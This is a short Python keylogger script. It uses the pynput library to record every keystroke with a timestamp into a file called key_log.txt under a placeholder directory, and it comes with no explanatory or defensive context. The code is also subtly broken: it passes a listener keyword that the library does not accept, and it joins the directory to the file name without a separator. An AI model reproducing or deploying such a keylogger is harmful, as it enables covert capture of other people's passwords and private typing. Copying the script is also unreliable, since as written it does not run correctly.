from pynput.keyboard import Key, Listener
import logging

log_dir = "yourcustomdirectory"

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_pressKey(key):
    logging.info(str(key))

with Listener(on_pressKey=on_pressKey) as listener:
    listener.join()
